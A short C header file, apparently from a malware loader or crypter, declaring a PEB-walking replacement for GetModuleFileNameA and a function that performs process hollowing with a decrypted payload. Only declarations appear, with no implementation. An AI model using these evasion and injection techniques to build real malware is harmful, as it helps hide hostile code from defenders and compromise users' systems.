#ifndef INJECTION_H
#define INJECTION_H

#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include <winternl.h> 

/**
 * implements GetModuleFileNameA by using PEB-walking
 */
void custom_GetModuleFileNameA(char* out, DWORD size);

/**
 * @brief Performs process hollowing with the decrypted payload.
 */
int ProcessHollowing(uint8_t* decrypted);

#endif /* INJECTION_H */